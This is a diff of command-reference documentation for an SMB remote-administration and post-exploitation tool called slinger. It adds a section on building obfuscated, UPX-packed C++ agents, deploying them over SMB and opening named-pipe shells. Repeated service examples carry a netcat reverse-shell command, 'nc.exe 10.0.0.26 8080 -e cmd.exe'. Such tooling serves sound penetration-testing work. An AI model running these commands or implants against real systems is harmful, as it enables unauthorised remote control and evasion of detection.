@@ -28,10 +28,7 @@ Example Usage: use <sharename> | use C$
 
 **Help:**
 ```
-ls [-h] [-s {name,size,created,lastaccess,lastwrite}]
-                  [--sort-reverse] [-l] [-r depth] [-o filename] [--show]
-                  [--type {f,d,a}]
-                  [path]
+ls [-h] [-s {name,size,created,lastaccess,lastwrite}] [--sort-reverse] [-l] [-r depth] [-o filename] [--show] [--type {f,d,a}] [path]
 List contents of a directory at a specified path. File paths with spaces must be entirely in quotes.
 ```
 
@@ -73,12 +70,8 @@ ls --type f -r 2        # Recursively list only files to depth 2
 
 **Help:**
 ```
-find [-h] [--path PATH] [--type {f,d,a}] [--size SIZE]
-                    [--mtime MTIME] [--ctime CTIME] [--atime ATIME] [--regex]
-                    [--iname] [--maxdepth MAXDEPTH] [--mindepth MINDEPTH]
-                    [--limit LIMIT] [--sort {name,size,mtime,ctime,atime}]
-                    [--reverse] [--format {table,list,paths,json}] [-o OUTPUT]
-                    [--empty] [--hidden] [--progress] [--timeout TIMEOUT]
+find [-h] [--path PATH] [--type {f,d,a}] [--size SIZE] [--mtime MTIME] [--ctime CTIME] [--atime ATIME] [--regex] [--iname] [--maxdepth MAXDEPTH] [--mindepth MINDEPTH]
+                    [--limit LIMIT] [--sort {name,size,mtime,ctime,atime}] [--reverse] [--format {table,list,paths,json}] [-o OUTPUT] [--empty] [--hidden] [--progress] [--timeout TIMEOUT]
                     pattern
 Search for files and directories across the remote share with advanced filtering options.
 ```
@@ -184,8 +177,7 @@ Example Usage: shares
 
 **Help:**
 ```
-enumpipes [-h] [--detailed] [--method {smb,rpc,hybrid}]
-                         [--output filename]
+enumpipes [-h] [--detailed] [--method {smb,rpc,hybrid}] [--output filename]
 Enumerate named pipes on the remote server via IPC$ share and RPC endpoints. Preserves current share connection by default.
 ```
 
@@ -1063,8 +1055,7 @@ Example Usage: servicedelete -i 123  OR svcdelete Spooler
 
 **Help:**
 ```
-serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME
-                          -s {auto,demand,system}
+serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME -s {auto,demand,system}
 Create a new service on the remote server
 ```
 
@@ -1097,8 +1088,7 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 
 **Help:**
 ```
-serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME
-                          -s {auto,demand,system}
+serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME -s {auto,demand,system}
 Create a new service on the remote server
 ```
 
@@ -1131,8 +1121,7 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 
 **Help:**
 ```
-serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME
-                          -s {auto,demand,system}
+serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME -s {auto,demand,system}
 Create a new service on the remote server
 ```
 
@@ -1165,8 +1154,7 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 
 **Help:**
 ```
-serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME
-                          -s {auto,demand,system}
+serviceadd [-h] -n NAME -b BINARY_PATH -d DISPLAY_NAME -s {auto,demand,system}
 Create a new service on the remote server
 ```
 
@@ -1340,8 +1328,7 @@ Example Usage: tasksshow -i 123
 
 **Help:**
 ```
-taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER]
-                          [-i INTERVAL] [-d DATE]
+taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER] [-i INTERVAL] [-d DATE]
 Create a new scheduled task on the remote server
 ```
 
@@ -1379,8 +1366,7 @@ Example Usage: taskcreate -n newtask -p cmd.exe -a '/c ipconfig /all > C:\test' 
 
 **Help:**
 ```
-taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER]
-                          [-i INTERVAL] [-d DATE]
+taskcreate [-h] -n NAME -p PROGRAM [-a ARGUMENTS] [-f FOLDER] [-i INTERVAL] [-d DATE]
 Create a new scheduled task on the remote server
 ```
 
@@ -1638,8 +1624,7 @@ Example Usage: upload /local/path /remote/path
 
 **Help:**
 ```
-download [-h] [--resume] [--restart] [--chunk-size CHUNK_SIZE]
-                        remote_path [local_path]
+download [-h] [--resume] [--restart] [--chunk-size CHUNK_SIZE] remote_path [local_path]
 Download a file from the remote server. File paths with spaces must be entirely in quotes.
 ```
 
@@ -1668,8 +1653,7 @@ Example Usage: download /remote/path/to/file.txt /local/path/to/save/file.txt
 
 **Help:**
 ```
-download [-h] [--resume] [--restart] [--chunk-size CHUNK_SIZE]
-                        remote_path [local_path]
+download [-h] [--resume] [--restart] [--chunk-size CHUNK_SIZE] remote_path [local_path]
 Download a file from the remote server. File paths with spaces must be entirely in quotes.
 ```
 
@@ -1770,23 +1754,26 @@ Example Usage: rmdir /path/to/remote/directory
 
 ## `rm`
 
-**Description:** Delete a file on the remote server
+**Description:** Delete one or more files on the remote server
 
 **Help:**
 ```
-rm [-h] remote_path
-Delete a file on the remote server
+rm [-h] [-n FILE_LIST] [remote_path]
+Delete one or more files on the remote server
 ```
 
 **Example Usage:**
 ```
-Example Usage: rm /path/to/remote/file
+Example Usage: rm file.txt, rm -n 'file1.txt file2.txt file3.txt'
 ```
 
 ### Arguments
 
 - **`remote_path`**: Specify the remote file path to delete
-  - Required: Yes
+  - Required: No
+
+- **`file_list`**: Space-separated list of files to delete (quoted)
+  - Required: No
 
 ---
 
@@ -1843,6 +1830,29 @@ Display the status of the current session
 ```
 Example Usage: info
 ```
+
+---
+
+## `history`
+
+**Description:** Display recent command history from the slinger history file
+
+**Help:**
+```
+history [-h] [-n NUM]
+Display recent command history from the slinger history file
+```
+
+**Example Usage:**
+```
+Example Usage: history, history -n 20
+```
+
+### Arguments
+
+- **`n`**: Number of history lines to display (default: 15)
+  - Default: `15`
+  - Required: No
 
 ---
 
@@ -2375,8 +2385,7 @@ Example Usage: network
 
 **Help:**
 ```
-atexec [-h] -c COMMAND --sp SP [--sn SN] [--tn TN] [--ta TA]
-                      [--td TD] [--tf TF] [--sh SH] [-i] [-w WAIT]
+atexec [-h] -c COMMAND --sp SP [--sn SN] [--tn TN] [--ta TA] [--td TD] [--tf TF] [--sh SH] [-i] [-w WAIT]
 Execute a command on the remote server
 ```
 
@@ -2533,12 +2542,8 @@ Example Usage:
 
 **Help:**
 ```
-eventlog query [-h] --log LOG [--id ID]
-                              [--type {error,warning,information,success,failure}]
-                              [--since SINCE] [--last MINUTES] [--limit LIMIT]
-                              [--source SOURCE] [--find FIND]
-                              [--format {table,json,list,csv}] [-o OUTPUT]
-                              [--verbose] [--order {newest,oldest}]
+eventlog query [-h] --log LOG [--id ID] [--type {error,warning,information,success,failure}] [--since SINCE] [--last MINUTES] [--limit LIMIT] [--source SOURCE]
+                              [--find FIND] [--format {table,json,list,csv}] [-o OUTPUT] [--verbose] [--order {newest,oldest}]
 Query Windows Event Log entries via RPC over \pipe\eventlog with filtering
 ```
 
@@ -2641,11 +2646,8 @@ Example Usage:
 
 **Help:**
 ```
-wmiexec task [-h] [--tn TN] [--sp SP] [--sn SN]
-                            [--cleanup-delay CLEANUP_DELAY] [--no-cleanup]
-                            [-i] [--no-output] [--timeout TIMEOUT]
-                            [--output filename] [--working-dir WORKING_DIR]
-                            [--shell {cmd,powershell}] [--raw-command]
+wmiexec task [-h] [--tn TN] [--sp SP] [--sn SN] [--cleanup-delay CLEANUP_DELAY] [--no-cleanup] [-i] [--no-output] [--timeout TIMEOUT] [--output filename]
+                            [--working-dir WORKING_DIR] [--shell {cmd,powershell}] [--raw-command]
                             [command]
 Execute commands using Windows Task Scheduler via WMI. Creates, executes, and cleans up scheduled tasks through the root\Microsoft\Windows\TaskScheduler namespace.
 ```
@@ -2685,10 +2687,7 @@ wmiexec task "ipconfig" --output network.txt
 
 **Help:**
 ```
-wmiexec dcom [-h] [-i] [--working-dir WORKING_DIR]
-                            [--timeout TIMEOUT] [--output filename]
-                            [--no-output] [--sleep-time SLEEP_TIME]
-                            [--save-name SAVE_NAME] [--raw-command]
+wmiexec dcom [-h] [-i] [--working-dir WORKING_DIR] [--timeout TIMEOUT] [--output filename] [--no-output] [--sleep-time SLEEP_TIME] [--save-name SAVE_NAME] [--raw-command]
                             [--shell {cmd,powershell}]
                             [command]
 Execute commands using traditional WMI Win32_Process.Create method via DCOM. Requires DCOM connectivity (ports 135 + dynamic range). May be blocked by firewalls.
@@ -2760,16 +2759,9 @@ Examples:
 
 **Help:**
 ```
-wmiexec event [-h] [--consumer-name CONSUMER_NAME]
-                             [--filter-name FILTER_NAME]
-                             [--trigger-delay TRIGGER_DELAY] [--no-cleanup]
-                             [--timeout TIMEOUT] [--no-output]
-                             [--save filename] [--working-dir WORKING_DIR]
-                             [--shell {cmd,powershell}] [--exe {cmd,pwsh}]
-                             [--trigger-exe TRIGGER_EXE] [-t TRIGGER] [-l]
-                             [-i] [--system] [--upload-path UPLOAD_PATH]
-                             [--script-name SCRIPT_NAME] [-o OUTPUT]
-                             [--raw-command] [--raw-exec RAW_EXEC]
+wmiexec event [-h] [--consumer-name CONSUMER_NAME] [--filter-name FILTER_NAME] [--trigger-delay TRIGGER_DELAY] [--no-cleanup] [--timeout TIMEOUT] [--no-output]
+                             [--save filename] [--working-dir WORKING_DIR] [--shell {cmd,powershell}] [--exe {cmd,pwsh}] [--trigger-exe TRIGGER_EXE] [-t TRIGGER] [-l] [-i] [--system]
+                             [--upload-path UPLOAD_PATH] [--script-name SCRIPT_NAME] [-o OUTPUT] [--raw-command] [--raw-exec RAW_EXEC]
                              [command]
 Execute commands using WMI Event Consumers (highest stealth method).
 
@@ -2827,11 +2819,8 @@ Examples:
 
 **Help:**
 ```
-wmiexec query [-h] [--interactive] [--describe CLASS]
-                             [--list-classes] [--template TEMPLATE]
-                             [--list-templates] [--namespace NAMESPACE]
-                             [--format {list,table,json,csv}] [-o FILE]
-                             [--timeout SECONDS]
+wmiexec query [-h] [--interactive] [--describe CLASS] [--list-classes] [--template TEMPLATE] [--list-templates] [--namespace NAMESPACE] [--format {list,table,json,csv}]
+                             [-o FILE] [--timeout SECONDS]
                              [query]
 Execute WMI Query Language (WQL) queries against the remote system. Supports interactive mode, class description, and multiple output formats.
 ```
@@ -2863,5 +2852,335 @@ Query Examples:
 - **`timeout`**: Query timeout in seconds (default: 120)
   - Default: `120`
   - Required: No
+
+---
+
+## `agent`
+
+**Description:** Build polymorphic C++ agents for named pipe command execution
+
+**Help:**
+```
+agent [-h] {build,info,deploy,list,rename,check,use,start,kill,rm,reset,update} ...
+Build polymorphic C++ agents for named pipe command execution
+```
+
+**Example Usage:**
+```
+Example Usage: agent build --arch x64 --encryption | agent build --arch both --no-encryption
+```
+
+### Subcommands
+
+#### `agent build`
+
+**Description:** Build C++ agents with advanced obfuscation and polymorphic encryption
+
+**Help:**
+```
+agent build [-h] [--arch {x86,x64,both}] [--encryption] [--no-encryption] [--debug] [--output-dir OUTPUT_DIR] [--dry-run] [--pipe PIPE] [--name NAME] [--pass PASSPHRASE]
+                           [--obfuscate] [--upx PATH]
+Build C++ agents with advanced obfuscation and polymorphic encryption
+```
+
+**Example Usage:**
+```
+Example: agent build --arch x64 --encryption --debug
+```
+
+##### Arguments
+
+- **`arch`**: Target architecture for agent build
+  - Choices: x86, x64, both
+  - Default: `both`
+- **`output_dir`**: Custom output directory for built agents
+- **`pipe`**: Specify custom pipe name for the agent (default: slinger)
+  - Default: `slinger`
+- **`name`**: Specify custom name for the output binary file
+- **`passphrase`**: Passphrase for agent authentication (HMAC-SHA256 with PBKDF2)
+- **`upx`**: Pack binary with UPX (provide path to upx binary, or use 'upx' for system default)
+  - Required: No
+
+---
+
+#### `agent info`
+
+**Description:** Display configuration and capabilities of the agent builder
+
+**Help:**
+```
+agent info [-h]
+Display configuration and capabilities of the agent builder
+```
+
+  - Required: No
+
+---
+
+#### `agent deploy`
+
+**Description:** Upload and execute polymorphic agent on target system via SMB
+
+**Help:**
+```
+agent deploy [-h] --path PATH [--name NAME] [--start] [--pipe PIPE] agent_path
+Upload and execute polymorphic agent on target system via SMB
+```
+
+**Example Usage:**
+```
+Example: agent deploy /home/user/slinger_agent_x64.exe --path temp\ --start
+```
+
+##### Arguments
+
+- **`agent_path`**: Path to the agent executable to deploy
+- **`path`**: Target path relative to current share (e.g., temp\, Windows\Temp\)
+- **`name`**: Custom name for deployed agent (default: random)
+- **`pipe`**: Specify pipe name for the agent (must match build-time pipe name)
+  - Required: No
+
+---
+
+#### `agent list`
+
+**Description:** Show all deployed agents and their status
+
+**Help:**
+```
+agent list [-h] [--host HOST] [--del DELETE_AGENT] [-f {table,list,json}]
+Show all deployed agents and their status
+```
+
+**Example Usage:**
+```
+Example: agent list -f json
+```
+
+##### Arguments
+
+- **`host`**: Filter agents by host
+- **`delete_agent`**: Remove agent from registry by ID (use 'all' to remove all agents)
+- **`format`**: Output format (default: table)
+  - Choices: table, list, json
+  - Default: `table`
+  - Required: No
+
+---
+
+#### `agent rename`
+
+**Description:** Change the ID of a deployed agent in the registry
+
+**Help:**
+```
+agent rename [-h] --old OLD --new NEW
+Change the ID of a deployed agent in the registry
+```
+
+**Example Usage:**
+```
+Example: agent rename --old svchost_abc123 --new my_agent
+```
+
+##### Arguments
+
+- **`old`**: Current agent ID
+- **`new`**: New agent ID
+  - Required: Yes
+
+---
+
+#### `agent check`
+
+**Description:** Verify if the agent process is still running via WMI query
+
+**Help:**
+```
+agent check [-h] agent_id
+Verify if the agent process is still running via WMI query
+```
+
+**Example Usage:**
+```
+Example: agent check svchost_abc123
+```
+
+##### Arguments
+
+- **`agent_id`**: Agent ID to check
+  - Required: Yes
+
+---
+
+#### `agent use`
+
+**Description:** Connect to and interact with a deployed agent via named pipe.
+
+ENCRYPTION & SESSION SECURITY:
+  Agents built with --pass use AES-256-GCM encryption with HMAC-SHA256
+  authentication. Each session uses unique encryption keys:
+
+  1. Agent generates random 16-byte nonce when you connect
+  2. Client proves knowledge of passphrase via HMAC-SHA256 challenge-response
+  3. Both derive session key using PBKDF2-HMAC-SHA256(passphrase_hash,
+     nonce, 10k iterations)
+  4. All commands in the session are encrypted with AES-256-GCM using this key
+
+  FORWARD SECRECY: Each session gets a new random nonce and unique session
+  key. Compromising one session does NOT affect past or future sessions.
+  To refresh encryption keys, exit and reconnect for a new session.
+
+INTERACTIVE SHELL COMMANDS:
+  help        - Show available commands
+  exit/quit   - Close session and disconnect from agent
+  <command>   - Execute any Windows command on the agent
+
+
+**Help:**
+```
+agent use [-h] [--timeout TIMEOUT] [--no-colors] agent_id
+Connect to and interact with a deployed agent via named pipe.
+
+ENCRYPTION & SESSION SECURITY:
+  Agents built with --pass use AES-256-GCM encryption with HMAC-SHA256
+  authentication. Each session uses unique encryption keys:
+
+  1. Agent generates random 16-byte nonce when you connect
+  2. Client proves knowledge of passphrase via HMAC-SHA256 challenge-response
+  3. Both derive session key using PBKDF2-HMAC-SHA256(passphrase_hash,
+     nonce, 10k iterations)
+  4. All commands in the session are encrypted with AES-256-GCM using this key
+
+  FORWARD SECRECY: Each session gets a new random nonce and unique session
+  key. Compromising one session does NOT affect past or future sessions.
+  To refresh encryption keys, exit and reconnect for a new session.
+
+INTERACTIVE SHELL COMMANDS:
+  help        - Show available commands
+  exit/quit   - Close session and disconnect from agent
+  <command>   - Execute any Windows command on the agent
+
+```
+
+**Example Usage:**
+```
+Example: agent use agent_12345 --no-colors
+```
+
+##### Arguments
+
+- **`agent_id`**: Agent ID to connect to
+- **`timeout`**: Connection timeout in seconds (default: 30)
+  - Default: `30`
+  - Required: No
+
+---
+
+#### `agent start`
+
+**Description:** Start a stopped or crashed agent using its deployment information
+
+**Help:**
+```
+agent start [-h] agent_id
+Start a stopped or crashed agent using its deployment information
+```
+
+**Example Usage:**
+```
+Example: agent start svcctl_tui0
+```
+
+##### Arguments
+
+- **`agent_id`**: Agent ID to start
+  - Required: Yes
+
+---
+
+#### `agent kill`
+
+**Description:** Find and terminate the agent process using WMI and taskkill
+
+**Help:**
+```
+agent kill [-h] agent_id
+Find and terminate the agent process using WMI and taskkill
+```
+
+**Example Usage:**
+```
+Example: agent kill svchost_abc123
+```
+
+##### Arguments
+
+- **`agent_id`**: Agent ID to kill
+  - Required: Yes
+
+---
+
+#### `agent rm`
+
+**Description:** Delete the agent executable file and update registry status
+
+**Help:**
+```
+agent rm [-h] agent_id
+Delete the agent executable file and update registry status
+```
+
+**Example Usage:**
+```
+Example: agent rm svchost_abc123
+```
+
+##### Arguments
+
+- **`agent_id`**: Agent ID to remove
+  - Required: Yes
+
+---
+
+#### `agent reset`
+
+**Description:** Kill all running agent processes and delete all agent files
+
+**Help:**
+```
+agent reset [-h]
+Kill all running agent processes and delete all agent files
+```
+
+**Example Usage:**
+```
+Example: agent reset
+```
+
+  - Required: Yes
+
+---
+
+#### `agent update`
+
+**Description:** Update the agent's file path in the registry
+
+**Help:**
+```
+agent update [-h] --path PATH agent_id
+Update the agent's file path in the registry
+```
+
+**Example Usage:**
+```
+Example: agent update svchost_abc123 --path c:\new\path\agent.exe
+```
+
+##### Arguments
+
+- **`agent_id`**: Agent ID to update
+- **`path`**: New file path for the agent
+  - Required: Yes
 
 ---
